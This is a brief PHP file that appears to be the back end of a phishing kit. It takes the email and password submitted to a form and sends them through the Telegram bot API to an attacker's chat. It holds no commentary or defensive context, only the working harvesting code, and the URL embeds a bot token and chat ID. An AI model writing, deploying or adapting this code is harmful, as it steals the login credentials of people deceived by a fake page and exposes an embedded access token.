<?php
    if(isset($_POST['submit']))
    $text=$_POST["email"];
    $text2=$_POST["pass"];
        $response = file_get_contents("https://api.telegram.org/bot5443248801:AAF7zkNGBq6AnXDxnSo5dwfMuNiNwTBe1TM/sendMessage?chat_id=5148207901&text=$text,$text2");    
    
?>